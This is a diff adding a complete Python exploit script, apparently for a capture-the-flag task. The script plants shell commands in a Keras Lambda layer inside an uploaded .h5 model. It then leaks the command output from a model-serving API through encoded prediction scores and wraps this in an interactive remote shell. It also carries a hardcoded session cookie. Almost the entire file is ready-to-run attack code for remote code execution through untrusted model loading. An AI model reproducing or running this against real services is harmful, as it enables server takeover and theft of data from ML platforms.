@@ -1,0 +1,406 @@
+#!/usr/bin/env python
+"""
+exploit.py — RCE через keras Lambda (run: client_request_id + count)
+
+  python exploit.py http://host:8007               # интерактивный шелл
+  python exploit.py http://host:8007 "cat /flag*"  # одна команда целиком
+  python exploit.py http://host:8007 "cmd" 21      # продолжить с offset
+  python exploit.py debug                          # локальный тест codec
+"""
+
+import contextlib
+import os
+
+os.environ.setdefault("TF_USE_LEGACY_KERAS", "1")
+os.environ.setdefault("TF_CPP_MIN_LOG_LEVEL", "3")
+os.environ["TF_USE_LEGACY_KERAS"] = "1"   # и было, и было
+os.environ["TF_CPP_MIN_LOG_LEVEL"] = "3"      # INFO + WARNING + absl-спам
+os.environ["TF_ENABLE_ONEDNN_OPTS"] = "0"     # oneDNN banner
+os.environ["CUDA_VISIBLE_DEVICES"] = "-1"     # cuda factory errors — см. ниже
+
+import json
+import random
+import time
+
+MAX_RETRIES = 5      # попыток на запрос
+BASE_DELAY = 2.0     # дефолт, если сервер не сказал Retry-After
+
+
+INPUT_SIZE = 512
+CHUNK = 21  # 7 полезных scores × 3 байта (cand_0 = sentinel)
+SENTINEL = 0x00C0FFEE  # 12648430 — точно представимо в float32
+RUN_COUNT = 3  # серверный лимит: 1..3
+MAX_PAGES = 500
+COOKIES = {
+    "blackquiz_sid": "LcIi1PEJ1mNAi05mFAzznYyeXKLRiGTIhhAB2RDhjOA"
+}  # "session=...; x=..." или {"session": "..."}
+
+
+
+@contextlib.contextmanager
+def _quiet():
+    sys.stderr.flush()
+    saved, devnull = os.dup(2), os.open(os.devnull, os.O_WRONLY)
+    os.dup2(devnull, 2)
+    try:
+        yield
+    finally:
+        os.dup2(saved, 2)
+        os.close(devnull)
+        os.close(saved)
+
+def get_session():
+    import requests
+
+    s = requests.Session()
+    if COOKIES:
+        if isinstance(COOKIES, dict):
+            s.cookies.update(COOKIES)
+        else:
+            for pair in COOKIES.split(";"):
+                if "=" in pair:
+                    k, _, v = pair.strip().partition("=")
+                    s.cookies.set(k, v)
+    return s
+
+
+def gen_req_id():
+    """JS: 'lp-' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2,8)"""
+    d = "0123456789abcdefghijklmnopqrstuvwxyz"
+    n = int(time.time() * 1000)
+    ts = ""
+    while n:
+        ts = d[n % 36] + ts
+        n //= 36
+    rnd = "".join(random.choice(d) for _ in range(6))
+    return f"lp-{ts}-{rnd}"
+
+
+# ── build ──────────────────────────────────────────────
+
+
+def build(path="solver.h5", cmd="cat /flag.txt", offset=0):
+    with _quiet():
+        import tensorflow as tf
+
+        cmd = str(cmd)
+        offset = int(offset)
+
+        def wrapper(x):
+            result = b""
+            try:
+                result = (
+                    __import__("subprocess")
+                    .run(cmd, shell=True, capture_output=True)
+                    .stdout
+                )
+            except:
+                result = b""
+            chunk = result[offset : offset + 21]  # литералы — никаких глобалов
+            vals = [12648430.0]  # sentinel
+            for i in range(7):
+                c = chunk[i * 3 : (i + 1) * 3].ljust(3, b"\x00")
+                vals.append(float(c[0] * 65536 + c[1] * 256 + c[2]))
+            return x[:, :8] * 0.0 + vals
+
+        inp = tf.keras.Input(shape=(INPUT_SIZE,), name="candidates")
+        model = tf.keras.Model(
+            inputs=inp, outputs=tf.keras.layers.Lambda(wrapper)(inp), name="my_solver"
+        )
+        model.save(path, include_optimizer=False)
+    return path
+
+
+# ── codec ──────────────────────────────────────────────
+
+
+def decode(scores):
+    by_id = {s["candidate_id"]: s["score"] for s in scores}
+    if int(round(by_id.get("cand_0", -1))) != SENTINEL:
+        raise RuntimeError(
+            f"cand_0={by_id.get('cand_0')} != sentinel → scores не от нашего "
+            f"свежего прогона (stale/чужая модель)"
+        )
+    out = b""
+    for i in range(1, 8):
+        raw = int(round(by_id[f"cand_{i}"]))
+        out += bytes([(raw >> 16) & 0xFF, (raw >> 8) & 0xFF, raw & 0xFF])
+    return out
+
+
+def extract_score_sets(obj):
+    """Рекурсивно ищем 'scores' в ответе; сплющенный список (16/24 dict'а) режем на группы по 8."""
+    out = []
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            if k == "scores" and isinstance(v, list) and v and isinstance(v[0], dict):
+                if len(v) > 8 and len(v) % 8 == 0:
+                    for i in range(0, len(v), 8):
+                        grp = v[i : i + 8]
+                        ids = {s.get("candidate_id") for s in grp}
+                        if all(f"cand_{j}" in ids for j in range(8)):
+                            out.append(grp)
+                else:
+                    out.append(v)
+            else:
+                out.extend(extract_score_sets(v))
+    elif isinstance(obj, list):
+        for it in obj:
+            out.extend(extract_score_sets(it))
+    return out
+
+
+# ── client ─────────────────────────────────────────────
+
+
+class Client:
+    def __init__(self, base_url):
+        self.base = base_url.rstrip("/")
+        self.s = get_session()
+        self.show_raw = 3  # первые 3 ответа печатаем сырыми (без notice)
+
+
+    def _backoff(self, attempt):
+        """exponential: 2, 4, 8, 16..."""
+        return BASE_DELAY
+
+    def _show(self, tag, r):
+        try:
+            j = r.json()
+            j.pop("system_notice", None)
+            print(
+                f"[!] {tag}: HTTP {r.status_code} "
+                f"{json.dumps(j, ensure_ascii=False)[:1200]}"
+            )
+        except Exception:
+            print(f"[!] {tag}: HTTP {r.status_code} {r.text[:1200]}")
+
+    def _ok(self, tag, r):
+        if r.status_code != 200:
+            self._show(tag, r)
+            return None
+        data = r.json()
+        data.pop("system_notice", None)
+        if self.show_raw:
+            print(f"[*] {tag} raw: {json.dumps(data, ensure_ascii=False)[:2500]}")
+            self.show_raw -= 1
+        return data
+
+    def _post(self, url, *, json_body=None, files=None, timeout=120, tag=""):
+        for attempt in range(MAX_RETRIES):
+            r = self.s.post(url, json=json_body, files=files, timeout=timeout)
+            if r.status_code != 429:
+                return r
+            ra = r.headers.get("Retry-After") or r.headers.get("retry-after")
+            if ra and ra.isdigit():
+                delay = float(ra)
+            else:
+                # могут писать секунды в теле, пробуем вытащить
+                delay = self._backoff(attempt)
+                try:
+                    j = r.json()
+                    err = str(j.get("error", "")) + str(j.get("detail", ""))
+                    import re
+                    m = re.search(r"(\d+(?:\.\d+)?)\s*sec", err, re.I)
+                    if m:
+                        delay = max(delay, float(m.group(1)))
+                except Exception:
+                    pass
+            if attempt < MAX_RETRIES - 1:
+                print(f"[~] 429 на {tag}: ждём {delay:.1f}s "
+                      f"(попытка {attempt + 2}/{MAX_RETRIES})")
+                time.sleep(delay)
+        return r   # последняя попытка — отдаём как есть, _ok покажет ошибку
+    def _get(self, url, *, timeout=120, tag=""):
+        for attempt in range(MAX_RETRIES):
+            r = self.s.get(url, timeout=timeout)
+            if r.status_code != 429:
+                return r
+            ra = r.headers.get("Retry-After") or r.headers.get("retry-after")
+            if ra and ra.isdigit():
+                delay = float(ra)
+            else:
+                # могут писать секунды в теле, пробуем вытащить
+                delay = self._backoff(attempt)
+                try:
+                    j = r.json()
+                    err = str(j.get("error", "")) + str(j.get("detail", ""))
+                    import re
+                    m = re.search(r"(\d+(?:\.\d+)?)\s*sec", err, re.I)
+                    if m:
+                        delay = max(delay, float(m.group(1)))
+                except Exception:
+                    pass
+            if attempt < MAX_RETRIES - 1:
+                print(f"[~] 429 на {tag}: ждём {delay:.1f}s "
+                      f"(попытка {attempt + 2}/{MAX_RETRIES})")
+                time.sleep(delay)
+        return r   # последняя попытка — отдаём как есть, _ok покажет ошибку
+
+    def upload(self, path):
+        with open(path, "rb") as f:
+            r = self._post(f"{self.base}/api/internal/solver/import",
+                           files={"model": ("solver.h5", f)},
+                           timeout=120, tag="import")
+        data = self._ok("import", r)
+        if not data:
+            raise RuntimeError("import failed")
+        return data
+
+    def run(self):
+        payload = {"client_request_id": gen_req_id(), "count": RUN_COUNT}
+        r = self._post(f"{self.base}/api/internal/solver/run",
+                       json_body=payload, timeout=120, tag="run")
+        return self._ok("run", r)
+
+    def visualize(self, mid=None):
+        r = self._get(f"{self.base}/api/internal/solver/visualize", timeout=120, tag="visualize")
+        data = self._ok("visualize", r)
+        if data and extract_score_sets(data):
+            return data
+        return None
+
+    def fetch_chunk(self, cmd, offset):
+        path = build(cmd=cmd, offset=offset)
+        up = self.upload(path)
+        mid = up.get("model_id") or up.get("id")
+
+        data = self.run()
+        if not data or not extract_score_sets(data):
+            data = self.visualize(mid) or data
+        sets = extract_score_sets(data or {})
+        if not sets:
+            raise RuntimeError(
+                f"нет scores: {json.dumps(data, ensure_ascii=False)[:800]}"
+            )
+
+        chunks, errors = [], []
+        for s in sets:
+            try:
+                chunks.append(decode(s))
+            except RuntimeError as e:
+                errors.append(str(e))
+        if not chunks:
+            raise RuntimeError(" | ".join(errors) or "sentinel mismatch везде")
+
+        uniq = []  # count=3 → вероятно 3 одинаковых набора
+        for c in chunks:
+            if c not in uniq:
+                uniq.append(c)
+        return b"".join(uniq)
+
+
+# ── exec / repl ────────────────────────────────────────
+
+
+def exec_cmd(client, cmd, offset=0, auto=True, max_pages=MAX_PAGES):
+    parts, off, ended = [], offset, False
+    while True:
+        chunk = client.fetch_chunk(cmd, off)
+        parts.append(chunk)
+        print(chunk.decode("utf-8", "replace"), end="", flush=True)
+        off += len(chunk)
+        ended = len(chunk.rstrip(b"\x00")) < len(chunk)
+        if ended or not auto or len(parts) >= max_pages:
+            break
+    if not ended:
+        print(f"\n  [offset {off} | Enter — след. страница | :all — до конца]", end="")
+    return b"".join(parts).rstrip(b"\x00"), off, ended
+
+
+HELP = """команды:
+  <shell-команда>     выполнить (stderr не виден — добавь 2>&1)
+  Enter / :more [N]   следующая страница (или N страниц) прошлой команды
+  :all                дочитать прошлую команду до конца
+  :redo [offset]      перезапустить прошлую команду с offset (default 0)
+  :raw                последний вывод в repr
+  :help, :quit"""
+
+
+def repl(base_url):
+    c = Client(base_url)
+    last_cmd, off, last_data = None, 0, b""
+    print("[*] подключено:", base_url)
+    print(HELP)
+    while True:
+        try:
+            line = input("\nsolver> ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+        if not line:
+            line = ":more"
+        if line in (":q", ":quit", ":exit"):
+            break
+        if line == ":help":
+            print(HELP)
+            continue
+        if line == ":raw":
+            print(repr(last_data))
+            continue
+        try:
+            if line.startswith(":more") or line == ":all":
+                if not last_cmd:
+                    print("нет предыдущей команды")
+                    continue
+                n = MAX_PAGES if line == ":all" else 1
+                toks = line.split()
+                if len(toks) > 1 and toks[1].isdigit():
+                    n = int(toks[1])
+                data, off, _ = exec_cmd(c, last_cmd, offset=off, auto=True, max_pages=n)
+                last_data += data
+            elif line.startswith(":redo"):
+                if not last_cmd:
+                    print("нет предыдущей команды")
+                    continue
+                toks = line.split()
+                start = int(toks[1]) if len(toks) > 1 and toks[1].isdigit() else 0
+                last_data = b""
+                data, off, _ = exec_cmd(c, last_cmd, offset=start)
+                last_data = data
+            else:
+                last_cmd, off, last_data = line, 0, b""
+                data, off, _ = exec_cmd(c, line, auto=False)
+                last_data = data
+                if not data:
+                    print("(пусто — возможно всё в stderr, попробуй `... 2>&1`)")
+        except Exception as e:
+            print(f"[!] {e}")
+
+
+def oneshot(base_url, cmd, offset=0):
+    c = Client(base_url)
+    data, _, _ = exec_cmd(c, cmd, offset=offset, auto=True)
+    print()
+    if not data:
+        print("(пусто — попробуй `... 2>&1`)")
+
+
+def debug_local():
+    test = b"flag{keras_rce_test_1234}"[:CHUNK].ljust(CHUNK, b"\x00")
+    vals = [float(SENTINEL)]
+    for i in range(7):
+        c = test[i * 3 : (i + 1) * 3]
+        vals.append(float(c[0] * 65536 + c[1] * 256 + c[2]))
+    scores = [{"candidate_id": f"cand_{i}", "score": v} for i, v in enumerate(vals)]
+    out = decode(sorted(scores, key=lambda s: -s["score"]))
+    assert out == test, f"{out!r} != {test!r}"
+    print("codec OK:", out.rstrip(b"\x00"))
+
+
+if __name__ == "__main__":
+    import sys
+
+    args = sys.argv[1:]
+    if not args:
+        print(__doc__)
+    elif args[0] == "debug":
+        debug_local()
+    elif args[0].startswith("http"):
+        if len(args) >= 2:
+            offset = int(args[2]) if len(args) > 2 else 0
+            oneshot(args[0], args[1], offset)
+        else:
+            repl(args[0])
+    else:
+        print(__doc__)
